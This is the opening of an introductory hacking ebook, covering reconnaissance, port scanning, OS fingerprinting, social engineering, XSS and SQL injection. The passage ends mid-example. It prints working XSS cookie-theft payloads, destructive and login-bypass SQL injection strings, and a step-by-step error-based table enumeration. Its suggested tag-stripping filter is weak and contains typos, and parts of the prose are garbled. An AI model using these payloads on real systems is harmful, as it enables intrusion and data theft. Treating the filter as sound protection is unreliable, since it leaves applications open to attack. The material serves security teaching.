![](cover.jpeg)

> HACKING

This book includes:

Hacking for beginners, networking hacking, hacker basic security and kali linux for hackers

Karnel Erickson

> Contents

[HACKING](#index_split_000.html_filepos101)

[Hacking for Beginners](#index_split_003.html_filepos6599)

[Introduction](#index_split_004.html_filepos7114)

[Chapter 1 – Types of Attackers](#index_split_005.html_filepos10030)

[Chapter 2 – Passive Enlightenment and Foot-printing](#index_split_006.html_filepos14535)

[Chapter 3 – Countermeasures](#index_split_007.html_filepos39961)

[Chapter 4 – Web Hacking, XSS, and SQL Injection](#index_split_008.html_filepos44192)

[Chapter 5 –  SQL Injection](#index_split_009.html_filepos59723)

[Chapter 6 – Phishing](#index_split_010.html_filepos73374)

[Chapter 7 – Spam](#index_split_011.html_filepos78746)

[Chapter 8 – Functionality of the Email System](#index_split_012.html_filepos84490)

[Chapter 9 – Causes](#index_split_013.html_filepos90857)

[Chapter 10 – Spam, Phishing: Countermeasures](#index_split_014.html_filepos94405)

[Chapter 11 – Legislation](#index_split_015.html_filepos108572)

[Chapter 12 – Honeypots](#index_split_016.html_filepos112211)

[Chapter 13 – Botnets](#index_split_017.html_filepos145423)

[Chapter 14 – Sniffing and Spoofing: Attack on Layer 2](#index_split_018.html_filepos179467)

[Conclusion](#index_split_019.html_filepos213764)

[Networking Hacking](#index_split_020.html_filepos216494)

[Introduction](#index_split_021.html_filepos216931)

[Chapter 1: The Basics of a Computer Network](#index_split_022.html_filepos219047)

[Chapter 2: Introduction Into Hacking](#index_split_023.html_filepos240296)

[Chapter 3: Coming Up With a Hacking Plan](#index_split_024.html_filepos278808)

[Chapter 4: Hacking Methodologies](#index_split_025.html_filepos298963)

[Chapter 5: Social Engineering](#index_split_026.html_filepos328418)

[Chapter 6: Physical Security](#index_split_027.html_filepos368588)

[Chapter 7: Passwords](#index_split_028.html_filepos399728)

[Conclusion](#index_split_029.html_filepos439937)

[Kali Linux For Hackers](#index_split_030.html_filepos441583)

[Introduction](#index_split_031.html_filepos441978)

[Chapter 1 - Basic and Essential Linux: The Necessary Basics](#index_split_032.html_filepos445691)

[Chapter 2 - Information Gathering And Vulnerability Analysis](#index_split_033.html_filepos449946)

[Chapter 3 – Understanding Everything about Network Security](#index_split_035.html_filepos462570)

[Chapter 4 – Linux Tools](#index_split_036.html_filepos537059)

[Chapter 5 - Introduction to Kali Linux](#index_split_037.html_filepos561054)

[Chapter 6 - Kali Linux Installation](#index_split_038.html_filepos563443)

[Chapter 7 – Solving Level Problems](#index_split_039.html_filepos578498)

[Conclusion](#index_split_052.html_filepos629358)

[Hacker Basic Security](#index_split_053.html_filepos630498)

[Introduction](#index_split_054.html_filepos631060)

[Chapter 1: Fundamentals and Importance of Cybersecurity](#index_split_055.html_filepos638919)

[Chapter 2: Cybersecurity Risks and attacks](#index_split_056.html_filepos654816)

[Chapter 3: Breaches in Cybersecurity](#index_split_059.html_filepos676864)

[Chapter 4: Malware – Attack, Types, and Analysis](#index_split_060.html_filepos695189)

[Chapter 5: Computer Virus and Prevention Techniques](#index_split_061.html_filepos717725)

[Chapter 6: Web Security and Workplace Security Guidelines](#index_split_063.html_filepos739807)

[Chapter 7: Basic Concept of Cryptography](#index_split_064.html_filepos762658)

[Chapter 8: Firewalls](#index_split_067.html_filepos815014)

[Chapter 9: Virtual Private Network](#index_split_069.html_filepos827442)

[Conclusion](#index_split_072.html_filepos863888)

© Copyright Karnel Erickson 2019- All rights reserved.

The content contained within this book may not be reproduced, duplicated or transmitted without direct written permission from the author or the publisher.

Under no circumstances will any blame or legal responsibility be held against the publisher, or author, for any damages, reparation, or monetary loss due to the information contained within this book. Either directly or indirectly.

Legal Notice:

This book is copyright protected. This book is only for personal use. You cannot amend, distribute, sell, use, quote or paraphrase any part, or the content within this book, without the consent of the author or publisher.

Disclaimer Notice:

Please note the information contained within this document is for educational and entertainment purposes only. All effort has been executed to present accurate, up to date, and reliable, complete information. No warranties of any kind are declared or implied. Readers acknowledge that the author is not engaging in the rendering of legal, financial, medical or professional advice. The content within this book has been derived from various sources. Please consult a licensed professional before attempting any techniques outlined in this book.

By reading this document, the reader agrees that under no circumstances is the author responsible for any losses, direct or indirect, which are incurred as a result of the use of information contained within this document, including, but not limited to, — errors, omissions, or inaccuracies.

> Hacking for Beginners

Step By Step Guide to Cracking Codes Discipline,

Penetration Testing, and Computer Virus.

Learning Basic Security Tools

On How To Ethical Hack And Grow

> Introduction

Congratulations on purchasing Hacking For Beginners and thank you for doing so.

There are plenty of books on this subject on the market, thanks again for choosing this one! Every effort was made to ensure it is full of as much useful information as possible. Please enjoy!

How Are Victims Found? Fingerprinting, Google Hacking, and Co.

In front of a hacker attack on a system, it is common practice for an attacker to engage in education and to inform himself about the target system, if it is already known. This allows the attack to be tailored to the target and aligned with any weak points that may be present in order to be effective at all costs. Depending on the target and motivation of the attackers, various types of systems are attacked. The spectrum of these target systems ranges from unsuspecting surfers across web pages and servers to corporations and governments. The enlightenment phase - the phase before the actual attack in which a system is scouted out - can be subdivided into passive recognition and active enlightenment. By passive elucidation, we mean the gathering of information without direct contact with the target system. On the other hand, active enlightenment attempts to gather information through direct interaction with the target system. In passive enlightenment, foot-printing, attackers seek information about the entire target system. So it is trying to create a rough "footprint." The information you are looking for, for example, the hardware used, IP address ranges, IP addresses of individual computers or information about a company's employees. Active enlightenment or fingerprinting attempts to profile individual components of a system. Thus, individual computers are scouted to find vulnerabilities such as open ports. The attackers thus create a "fingerprint " of individual system components and thus try to discover potential entry gates.

The aim of this book is to introduce the techniques used in preparation for the preparations and to point out appropriate countermeasures. For this purpose, first, the various types of attackers and their motivation for attack and potential target selection are introduced. Subsequently, the phase of clarification with the techniques used in passive and active elucidation is presented in detail. Finally, countermeasures are shown, addressing both general measures and those specifically tailored to the clarification techniques presented here.

> Chapter 1 – Types of Attackers

As attackers differ in their motivation and technical capabilities, different types of attackers attack different types of systems and have different attacking intentions. According to Roge, attackers can be divided into seven types. These will be briefly presented below.

Newbie

Members of this group are mostly new to hacking and have only basic computer and network security skills. Therefore, they use preprogrammed software tool kits for their attacks. These software tool kits are widely used on the internet and easy to find. Their attacks are therefore limited to systems for which already existing tool kits exist.

Cyber Punks  

Cyberpunks possess advanced software, programming, and system knowledge. They are quite criminal in their intentions. Cyberpunks attack web servers to redesign web pages (defacing) and are often active in spam and credit card fraud.

Internals  

The Internals group consists of former and dissatisfied employees. They are usually technically savvy and can make attacks based on their former or current job functions and responsibilities. Their attacks are directed against their former or current employers since they can use their knowledge of the systems there.

Coders  

This group has the extensive technical knowledge and is able to exploit security vulnerabilities and so-called program exploits.

Old Guard Hackers  

This group does not necessarily pursue criminal intentions but is guided by the hacker ethic of the first hacker generation. According to [Raym03], hacking ethics is defined as the belief that information should be freely available, and the belief that attacks on computer systems are ethical. It is, therefore, considered ethical as long as no criminal intentions are being pursued, but rather the onslaught of fun and exploration enjoyment. Legally, attacks on computer systems are ethically unjustifiable and thus punishable.

Professional Criminals and Cyber Terrorists  

These groups consist of professional criminals and former secretaries who are well trained and equipped. They mainly engage in the field of industrial espionage and its targets are thus networks. Little is known about this group, and they are considered very dangerous.

Enlightenment

Despite the differences in target selection, technical capabilities, and motivation for attacks, all types of attackers need detailed knowledge of the target system prior to an attack. Thus, prior to each attack, clarification must be provided, and information must be collected. The techniques used in the explanation are presented in the following section.

Explanation

Aufklarung means that the information gathering and evaluation is under attack in the context of the topic of the seminar. For an attacker, it is necessary to select a target before the actual attack and to scout it out. A first impression of the target and the subsystems used, i.e., the individual computers, is made by an attacker using passive elucidation. After evaluating this information, he usually finds a system that he now investigates in more detail to find vulnerabilities. With the help of active enlightenment, it is now possible to more accurately profile such concrete goals and adapt them to the software used. Aufklarung is used in a hacker attack so in order to increase the chances of success of the attack.

> Chapter 2 – Passive Enlightenment and Foot-printing

Included in the passive enlightenment/foot-printing category are techniques that can be used to gather information about a goal without interacting directly with the target system. By using "third " sources for obtaining information, no traces of the attacker will be left on the target system, for example in the form of IP addresses in server log entries. The possibilities of foot-printing include, among other things, examining the company website, possibly using a proxy to disguise your own identity and IP address.

General Search

General information about a destination can be found with a general search using search engines, web pages or news. Important information The technology used in the target system can be used to study vacancies, as the requirements for network specialists can be used to refer to the products used. For an attacker, it may also be important to examine the personal web pages of employees (if any) and collect instant messaging usernames, email addresses, and phone numbers. In general, any information about the target can be useful at attack time, and therefore, at least in the phase of enlightenment, is important and should be collected.

Google Hacking

Google hacking is a technique that uses the so-called "advanced " operators of search engines to find information on the web that an attacker can exploit for an attack. This technique can be used to find all the files and information that reside on a web server indexed by search engine web crawlers. These include directory lists of servers, the exact version of the server software used, information about a company's intranet, or personal information about employees. So, as Google Hacking exploits, private or security-sensitive information have been inadvertently compromised on servers, and search engine crawlers have indexed that information, leaving them with a search query. Other possible Google Hacking queries include a company's domains, security vulnerabilities, and associated exploits, targets that match specific exploits, usernames, passwords, or source code.

The following operators represent a selection of operators used in Google Hacking searches:

> ·  intitle: restricts the results to documents containing the directly following expression in the title

> ·  inurl: constrain the results to documents containing the directly following expression in the URL

> ·  filetype: limits the results to documents with the corresponding file extension. In addition, a desired search term ff must be specified.

> ·  site: restrict the results to documents in the specified domain

These operators can now be combined in almost any way to search queries and can 'bring up' a lot of security-relevant data. As an example, here is a search query from the Google Hacking database [Long07], in which many Google requests from the network security area are recorded.

Enlightenment

If the permissions on the server are not set correctly and the Google crawlers can read the contents of the / etc / password folder, an attacker can use this search to find password files. The attacker can then attempt to decrypt the found password files, which are usually encrypted, by means of a dictionary attack, and access the discovered system with the decrypted passwords. Another possibility for the attacker is to add the decrypted "password" to his dictionary for further attack.

DNS

The Domain Name System is a hierarchical, distributed database that assigns one or more IP addresses to a domain name. Normally, this IP address is hidden from the user, but it can be explicitly queried and thus used as a starting point for further searches regarding the IP address range of an organization or for WHOIS queries. [Mock87]

WHOIS queries

The NICNAME/WHOIS protocol is used to query distributed databases that provide a directory of registered domains and IP addresses. Originally, the standard [HaSF85] provided only one central database on one central server, as all domains were managed centrally by the Network Information Center. As the Internet grew, the standard was updated and switched to a distributed database system. [Daig04] The administration of the various top-level domains has also been transferred to several registrars, each of which maintains its own WHOIS database. WHOIS queries are possible with different tools or via web interfaces. The DENIC (German Network Information Center) is responsible for assigning and administering .de domains, whose database provides the following information for a WHOIS query of a domain [DENI07]:

> ·  Holder

This is the domain owner who is the contracting party of DENIC and has material claims to this domain.

> ·  Admin-C

This is the administrative contact person named by the domain owner and obliged to DENIC to make binding decisions on the domain. This is important if the domain owner is not a person but a company or organization.

> ·  Tech-C

This is the technical maintainer of the domain, in private individuals with rented webspace usually a provider. These providers rent webspace and operate name-servers for domains stored on their webspace, which would be a great expense for private individuals.

> ·  Zone-C

The zone administrator is the technical maintainer of the registered name servers of the domain, which is responsible for the accessibility of the name servers. For private individuals, this is usually the same provider that is also Tech-C.

Name, organization, address, postal code, city, country, and timestamp of the last changes issued. Optionally for Holder and Admin-C, but always at Tech-C and Zone-C, phone numbers, faxes, and email addresses are displayed. Furthermore, technical information such as the expiration date of the domain and at least two name servers are issued for each domain.

The attacker can now use the specified name servers as a starting point for more intensive searches. The specified contact details for the admin can be used by attackers for social engineering (Section 3.3.1), and the specified expiration date of the domain is important.

Enlightenment

If a WHOIS query with an IP address as a parameter is executed, the database of the responsible RIR is queried and information about the holder of the IP address and the holder assigned IP address range is output. This information is very useful for active enlightenment, as certain IP addresses can now be examined for active systems, i.e. connected computers that respond to requests from outside.

Active Enlightenment

Active enlightenment refers to techniques that interact directly with the target system to gather more information about the target system. Examples include port scanning to find open ports on a server, and OS fingerprinting to identify the running operating system of the server. These techniques are applied to servers discovered by passive enlightenment. The then-found information about the systems, in turn, makes it possible to make better adapted and thus potentially more successful attacks.

Ping Sweeps

Network Ping sweeps such computers that are turned on and respond to a ping request—there are active systems that can be found in a network by all the IP address ranges being equally studied. The ping process itself is implemented using the Internet Control Message Protocol (ICMP) and sends out ICMP echo request packets. If a system is active, it responds with an ICMP Echo Reply packet. If an attacker has found a list of active systems by ping sweeps on an IP address area, they can be further investigated.

Port Scanning

If an attacker has found active systems, he can perform this one port scan with the aim of finding open ports. Open ports are ports where applications wait for incoming connections and accept connections. A port scanner sends TCP or UDP packets to a port range and can close responses to the status of those ports. Responses to packages with certain flags set are standardized according to [Info81b]. Some known scan types are [McSK99]:

> ·  TCP Connect Scan

This scan establishes a TCP connection with the 3-way handshake (SYN, SYN / ACK, ACK) to the destination port. If successful, it can be deduced that a service is running on this port and accepts connections.

> ·  TCP SYN Scan

Here, no connection is established, but only an SYN package sent to the destination port. If the system responds with SYN / ACK, this port is open. If an RST / ACK comes back, the system will not listen to this port. Because no connection is established, this scan does not appear as a connection or connection attempt in the server logs. This leaves the IP address of the attacker and the scan attempt undetected.

> ·  TCP FIN Scan, TCP Xmas Tree Scan, TCP Zero Scan

These scans set the FIN flag/FIN, URG and PSH flag/no flags. If the ports are closed, an RST is received as a response, open ports ignore these packets and do not respond.

> ·  UDP scan

An empty UDP packet is sent to the destination port. If the answer is ICMP port unreachable, the port is closed, if no answer is received, it will be closed.

Using the open ports of a system, an attacker can identify running applications that accept connections. With this information, the attacker can see what function the system is doing, ie for a web server, port 80 is usually for HTTP and for a mail server, ports 25 and 587 for SMTP. With this knowledge, the attacker can decide if he chooses this server as the target, and adapt his attack to the existing applications.

OS Fingerprinting

With OS fingerprinting, TCP/IP packets with specific flags are sent to a destination and the answers are analyzed, so that the operating system used can be concluded by comparing them with a database. The database contains the responses from different operating systems to these TCP/IP packets that were discovered experimentally. OS fingerprinting leverages the TCP/IP stack, the signature TCP/IP implementation that differs from OS to OS. A system can respond to a series of requests by creating a "fingerprint." The request types used for fingerprinting can be broken down according to the package types used:

TCP Requests

These requests use TCP packets. The packages contain different flags and the reactions of the target system to these flags are analyzed.

FIN sample  

A packet with a set FIN flag is sent to an open port. The correct answer would be not to respond, but many implementations send an RST back. FIN Probe is similar to TCP FIN Scan but assumes that only closed ports return an RST. So the FIN sample only provides information about an implementation if it is safe to say that the requested port is open due to another scan.

TCP ISN Sampling  

Here the initial sequence number of the TCP implementation is tried to determine a binding request. Depending on the operating system, different methods will be used. Older Unix systems increase in 64k increments, newer ones increase randomly, Linux systems choose random numbers, and Microsoft uses a time-dependent method in which the ISN increments by a fixed amount in each unit of time.

TCP Timestamp  

Here, the value of the TCP timestamp option, a field with the current time of the sender, is examined. Some implementations do not support the option, while others increase the value at fixed time intervals.

TCP Options  

Here, certain TCP options are used in the sent packages. Depending on whether these are included in the answer, you can see which options are supported and thus close to the implementation. In one package several options can be set and tested at the same time.

TCP Initial Window  

TCP Initial Window checks the set window size for returned packets. The window size is partially unambiguous to an implementation.

ACK Value  

The ACK flag is set in response to a FIN / URG / PSH and the acknowledgment number field contains a different number depending on the implementation. Most systems set the Initial Sequence Number (ISN) of the received packet as an acknowledgment number in response to a FIN/PSH/URG request, and some implementations increase ISN by 1.

ICMP Requests

ICMP requests are requests through the ICMP protocol. The ICMP protocol is used to exchange error and control messages.

ICMP Error Message Quenching  

Some operating systems limit the sending rate for error messages. This is tested by sending multiple packets to a random UDP port that is closed. This provokes ICMP Destination Unreachable error corrections. The implementation can then be identified based on the input rate of the scanned system's error alerts.

ICMP Message Quoting  

With an ICMP error notification, part of the error-causing packet is returned. The implementations differ here in the amount of data sent. Almost all systems send the IP header and eight bytes back. Solaris and Linux operating systems return one bit or more.

ICMP Error Message Echoing Integrity  

This method works like ICMP Message Quoting, again the ICMP error notifications are examined. Here especially the header field and the checksum are analyzed.

Type of Service  

The Type of Service field in the ICMP error notification ICMP Port Unreachable is set to 0 by default. However, some implementations differ on this point.

IP Requests

For IP requests, fields of the IP header [Info81a] and special properties of the respective implementation are examined with respect to fragmentation.

IPID sampling  

Here the IP Identification field is analyzed. The Identification field in the IP header contains a number that helps to correctly re-assemble fragmented parts of a datagram. Most operating systems increase the IP ID by 1 with each packet sent, while others randomly choose the ID or increase it by 1 in increments.

Don’t Fragment Bit  

They do not fragment bit in the IP header prohibits fragmenting the datagram. Some systems set this bit in certain cases, while others do not set it so that the particular behavior can help identify the implementation.

Fragmentation handling  

This technique examines the reassembly of fragmented IP packets. In particular, the reassembly of overlapping fragments is observed here.

Passive OS fingerprinting, a variant of the presented OS fingerprinting, does not actively send packets but observes incoming packets. An attacker could use passive OS fingerprinting by connecting to a server, making a request to the server, and examining packets sent by the server. Since the TCP / IP implementation differs, the observation and analysis of the following fields identify operating systems [PeCh04]:

> ·  TTL start value (8 bit) (IP header)

> ·  Window size¨ (16 bit) (TCP header)

> ·  Maximum segment size¨ (16 bit) (TCP header)

> ·  "Don 't fragment " flag (1 bit) (IP header)

> ·  sackOK option (1 bit) (TCP header)

> ·  nop option (1 bit) (IP header)

> ·  Window Scaling Option (8 bit) (TCP header)

> ·  Start packet size¨ (16 bit) (TCP header)

These fields together result in a 67-bit long signature, which is compared with a database. Since only the incoming packets are examined, the examination for the source host is not apparent.

Mixed Forms

Some techniques are both passive (with no direct interaction with the target), as well as active enlightenment, through direct interaction with the goal, to be assigned, or used both in enlightenment and attack. The best known of these hybrid forms is social engineering.

Social Engineering

Social engineering is the art of manipulating a human being to act in the interests of the aggressor. [PeCh04] It is usually used to:

> ·  get physical access to protected resources

> ·  to obtain permissions for the remote access

> ·  access protected information

> ·  violate other security controls

If social engineering is used in direct interaction with, for example, employees of the target company in order to obtain information, it can be attributed to active explanation. If the attacker does not interact directly with the employees but overhears, e.g., a conversation between two employees, this is to be assigned to the passive explanation. Social engineering can be used, for example, in order to give the attacker access to a protected security area.

Some of the methods used are fraudulent behavior, flattery, use of (pre-exchanged) authority or exploitation of pride. When using social engineering, it is important for the attacker to credibly embodies his role, which is only ensured by sufficient information from the Aufklarungs phase. Social engineering is not a technical method but exploits the psychological properties of humans, such as the recognition of authority or vanity. The application of social engineering is possible through many means of communication, be it personally, by telephone, email or instant messaging, which is why gathering contact data of any kind during the enlightenment phase is very important.

> Chapter 3 – Countermeasures

In this section, we will now discuss some countermeasures for use against the clarification techniques discussed above. First, some general countermeasures are presented, followed by special techniques against passive enlightenment, active enlightenment, and social engineering.

General

Common countermeasures include applicable security policy, removal of standard files such as the server software, and the software version number and changing the default settings, such as the default user name and password. It is also important to educate users on secure passwording and handling sensitive information. It is also absolutely necessary to regularly update the software used and to keep track of reports about "security gaps" in the software used.

Passive Enlightenment/Foot-printing

As a countermeasure to Internet research and Google hacking, it is advisable to check the contents of your own website and remove unneeded published information. If this is not possible, it is important to hide sensitive files or directories because Google Crawlers index all files residing on a web server. By creating a robots.txt file containing control statements for the various crawlers, the behavior of the search engine crawlers can be influenced. For example, by specifying in robots.txt, crawlers can be banned from entering certain directories and tracking links. Specifying META tags in the HTML header allows the crawlers to index the pages found in the search engine cache. Setting up password-protected areas using htaccess also helps hide information from crawlers. Sufficient protection of a page can be checked by Google search queries. In doing so, Google Hacking methods, which are also used by attackers, are applied to the site to be protected in order to find unneeded published information. [Long05]

On the other hand, queries by WHOIS and DNS databases, which were also used by attackers, cannot be prevented. This is because the WHOIS entries are required by law and the DNS entries are required to call a domain. This information is thus freely available, and since the query is about databases that are managed by "third parties ", it is unclear to a potential attacker who has requested these entries.

Active Enlightenment/Fingerprinting

The port scan of a system cannot be prevented, but it can be ensured that no unnecessary ports are open. Port scans and thus preparation for attacks can be detected early on if the server logs are analyzed on a regular basis. If such seizure preparations are detected, it helps to regain your own safety precautions. Check and adjust as needed, such as updating the firewall settings to other software or software with known security gaps. Another active option is, with intent, to open wrong ports to swap potential attackers.

OS fingerprinting cannot be prevented, but it can be detected by the server logs. As an active countermeasure to Nmap, IP Personality, a kernel module, which can swap a different system by changing flags in the TCP header.

Social Engineering

It is important to raise awareness of the existence of social engineering and the progression of a social engineering attack. Here a training of the own coworkers helps to handle security-relevant data and particularly for handling social engineering ring. Employees should be trained to unambiguously identify the identity of the counterpart before sensitive data is released. Badly prepared social engineering attacks can be identified by detailed inquiries.

> Chapter 4 – Web Hacking, XSS, and SQL Injection

Over the past decade, the World Wide Web has expanded rapidly and is still evolving today. Traditional systems are being replaced by dynamic, browsable applications that are hosted on web servers and access the vast database. The continued implementation of the broadband Internet has paved the way for multimedia enhancements. And the dramatic evolution of wireless technologies today offers WWW a chance to reach anywhere.

Undoubtedly, the benefits of the World Wide Web are to overcome spatial and temporal limits. Today, we can order from the comfort of your home a new phone that has just been produced in Japan, order it through the web, or apply for a job remotely in South America with one click. In business, the Web is being exploited more and more, as it makes access to customers and opportunities much easier. The bank services are now online. Shopping goes on the net with fast and easy payment by credit cards. And more and more e-business companies are born.

But for any web-based application that goes online, and any e-business that powers up a rack of servers, malicious hackers with appropriate attack techniques are also available. While people are coming to terms with new technologies and making their network, web servers with firewalls, and defense systems more secure, the attackers have also become smarter so they can break these systems and firewalls. The continued rapid growth of web technologies also leaves many security gaps. In this book, as we mentioned before, the well-known web-application-hacking techniques are presented, and avoidance methods are shown.

First, let us discuss an overview of web application architecture.

Web Application Architecture

Traditional HTML pages are static, that is, they will eventually be generated and will be available in that form on the Web server through the URL of the page. Of course, it is also desirable to have an HTML page dynamically generated, for example, to influence recent page data of the caller. Dynamic web pages are generated by a web application at runtime.

Web applications generally differ in client-side and server-side web applications. Client-side web applications are run on client machines. The known technologies for such web applications are JavaScript, VBScript Flash, Applet. Server-side web applications are executed on the server, often used for the dynamic generation of data, e.g., from a database. The well-known technologies for server-side web applications are Common Gateway Interface (CGI), Server APIs, and scripting languages such as ASP, PHP, JSP.

A common dynamic web system consists of 4 components: the web client (often a browser), the front-end web server, the server applications, and the server database. The front-end web server acts as an interface for interfacing with the outside world, getting input from the web client via HTML forms and HTTP, and returns an output generated by the application in the form of HTML pages. The server application works with the database to perform transactions.

Each component of the web system has its own specific vulnerabilities. Here is a short overview of the basic types of attacks on each component:

> ·  Web client: execute active content, client software vulnerability exploits, cross-site scripting (XSS).

> ·  Web server: server software security vulnerabilities exploitation.

> ·  Web application: an attack against authentication, authorization, input validation.

> ·  Database: execute privileged commands through database query, manipulate queries (SQL Injection) to get excessive record.

Of these, XSS and SQL Injection have been selected as web-based tools.

XSS

Cross-site scripting (XSS) exploits a security gap in the attacked application and can be used to modify the data of an original page, thereby paying for the active attacks. In XSS, information is embedded by an attacker in a supposedly secure site. [ScSh02]

One can imagine that a malicious user leaves a few lines of JavaScript code as a message in one guestbook for others. In the event that the guestbook does not consider this user's input suspect, script code will be embedded in the page and later exported to any user's browser that allows JavaScript code. Often important information such as access data, personal or financial data is stolen in the cookie.

The easiest way to test an input field if it contains an XSS security gap is to type the following line:

<script Language = "Javascript"> alert ( 'hello '); </ script>

If the browser opens a window with the text 'Hello,' this means that JavaScript has been written to the guestbook as script code. Then the user browser reads the HTML page with the written script code and executes it.

Types of XSS

Depending on location (client-side or server-side) and duration (permanent or non-permanent), cross-site scripting attacks are divided into three basic types.

Type 0

Type 0 are the XSS latches that contain the manipulated script code on the client-side. For example, this could be a JavaScript code that gets a URL argument value and writes unfiltered:

http://www.example.com/search.cgi?query=<script>alert(document.cookie); </ Script>

When the client browser submits this URL, it then gets an HTML page containing the JavaScript code. This embedded JavaScript code is executed on client machines with current client rights to steal cookies. The code in < script > tag is unlimited, and it can also be replaced by a script code from other servers.

Example scenario:

1.  > Is there a link?

http://www.example.com/search.cgi?query=<script>alert(document.cookie); </ Script> published in the forum or on a web page.

2.  > Alice clicks on the link

3.  > The malicious script opens an HTML page on Alice's computer

4.  > This HTML page contains the malicious script that is executed on Alice's computer with its privilege rights.

Type 1

In this type, the manipulated script is on the server-side and not permanent. There is no problem with the subsequent execution of the script with non-random input. For example, a search function on the server that gets the search term ff as input without filtering and outputs something like this:

The one you searched for: "search term" is in .....

And she is using search string ff = < script > alert (document.cookie); < / script > , which provide output:

The one you are looking for: <script> alert (document.cookie); </ script> is located in .....

The script code is executed again on user computers in order to steal cookies with sensitive information.

Example scenario:

1.  > Alice often visits a Web site A that contains XSS security holes.

2.  > Tom creates a manipulated URL to site A and sends it to Alice

3.  > Alice visits the manipulated URL

4.  > The embedded script in the URL will be executed in Alice's browser as if it came directly from web page A. The script can steal sensitive information (banking account, email account, ...) and send it to Tom without Alice's knowledge.

Type 2

With XSS with Type2, the manipulated script code is permanently written to a web page. It is the most dangerous form since it affects many users. This type 2 works similarly like Type 1, only that the output persistently stays on the page.

Example:

1.  > Website A, again containing XSS security holes, allows users to post news or other content.

2.  > Tom posts a message on this website:

"A really good website! <Script> alert (document.cookie); </ script>”

3.  > When looking at the news, the script code is run on user machines and therefore can user cookies, other things without his knowledge to Tom.

Protection

Website operators should never trust user input. All incoming input values must be viewed and filtered. You should define an input table exactly and only allow such input.

XSS attack actually embeds a manipulated script code between 2 < script > tag and < / script > tag (or < object>, < applet>, < embeded > ). If these tags are removed, the malicious script code is no longer executable. You can filter these tags by typing through, for example, the following PHP code:

function filter ($ input) {

$ input = ereg_replace ("<script>", "", $ input); $ input = ereg_replace ("</ script>", "", $ input); $ input = ereg_replace ("<object>", "", $ input); $ input = ereg_replace ("</ objectt>", "", $ input); $ input = ereg_replace ("<apllet>", "", $ input); $ input = ereg_replace ("</ applet>", "", $ input); $ input = ereg_replace ("<embeded>", "", $ input); $ input = ereg_replace ("</ embeded>", "", $ input);

return $ input; }

This removes all entries with dangerous tags, e.g., the above cookie stealing. Script code looks like this after filtering:

alert (document.cookie);

It is, of course, no longer harmful! In some cases, the input should be clearly printed unchanged. You can do that by entering the user escapes, that is, all special characters are with replaced their equivalent in HTML- the so-called escape sequences. These escape sequences are a sequence of normal characters that represent their special characters. For example, the string < script > will appear as a normal string < script > . displayed later as a string < script > by the browser, which is recognized as no more tag. The conversion of special characters can be realized with the function htmlentities ().

function escaping ($ input) {

$ input = htmlentities ($ input);

return $ input;

}

This method is a simple and secure way to deal with XSS. Nevertheless, there is a big disadvantage that all special characters and thus, all tags are blocked. Users can, of course, not use HTML tags to format their text.

By turning off ActiveScripting in the browser, you can protect against XSS on the client-side - no manipulated script code is executed on the client-side. Nevertheless, this does not help with pure HTML injection (e.g., with < iframe > tag ...), but it is not dangerous like real XSS. It cannot steal cookies from clients under any circumstances.

> Chapter 5 –  SQL Injection

What is SQL injection?

An SQL injection is the manipulation of transaction SQL queries into an application to provoke an unforeseen reaction. [ScSh02] Typically, web applications provide an interface for users to communicate with the database, At this point, there are security gaps when web applications do not properly filter user input, so hackers can use the SQL commands to send data to the database, destroy data, or even invade underlying systems.

Functionality and SQL injection types

Depending on attacks, there are generally three main categories of SQL injection subdivided: SQL manipulation, code injection, function call injection. These will be explained in the following sections with examples.

1.  > SQL Manipulation: Is a process where normal running database queries are affected by SQL statements. The general case, the attacker, is inserted into the information of the where clause of an SQL statement returned by the database. Thus, manipulating the where clause can change the entire SQL statement.

2.  > URL of a web page:

http://www.nosecurity.com/mypage.asp?user=hacker&pass= 'hack '

and becomes the SQL statement of the web application for the database query:

Select * from table where login = 'hacker ' and password = 'hack '

After the execution of this query, if there are such user and password in the table, the user is logged in successfully. Now the password is assigned as ' or 1 = 1 -. The SQL statement of the web application looks like this:

Select * from table where login = 'hacker ' and password = ' ' or 1 = 1- comment

Login occurs whenever there is a user hacker, regardless of the password. Here are the typical inputs in form fields to determine if an application with SQL injection is vulnerable:

Discard database table: '; drop table users--

Shutdown Database: '; shutdown--

Authentication without password: no matter 'or ' a '= ' a '

Authentication only with username: admin '-

The double hyphen ( -) converts all data into comments. Thus all other conditions are negligible.

3.  > Code Injection: is a process of injecting new SQL commands into a stream of commands. This type of attack is especially dangerous if multiple SQL commands are supported per database query. Consider an example made with IIS, ASP, and MSSQL:

Is the URL of a webpage: http://www.nosecurity.com/mypage.asp?id=45

In the URL, the id parameter is accepted by the speaker script as part of the SQL query. More specifically, it is used as a parameter for the where clause. Let's add another SQL code:

http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--

Information_schema.tables is a table that stores all information from other tables on the server.

SQL command: SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES returns the first table name as string (nvarchar) of information schema.tables, which is combined with an id as int = > An error message from the server:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07 ' [Microsoft] [ODBC SQL Server Driver] [SQL Server] Syntax error converting the nvarchar value 'logintable ' to a column of data type int. /Mypage.asp, line 5

In the error message, we know a table called 'logintable '.

Username and password included. Next SQL code for the query:

http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'logintable ' -

Analogous to information schema.tables, information schema.columns contains all column names as string united with id = 45 as int . It returns to error message:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07 ' [Microsoft] [ODBC SQL Server Driver] [SQL Server] Syntax error converting the nvarchar value 'login_id ' to a column of data type int. /Index.asp, line 5

From the error message we know that the first column is called 'login id '. The following query will retrieve the second column name:

http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'logintable ' WHERE COLUMN_NAME NOT IN ( 'login_id ') -

Output:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07 ' [Microsoft] [ODBC SQL Server Driver] [SQL Server] Syntax error converting the nvarchar value 'login_name ' to a column of data type int. /Index.asp, line 5

Continue to get the third column name:

http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'logintable ' WHERE COLUMN_NAME NOT IN ( 'login_id ', 'login_name ') -

Output:

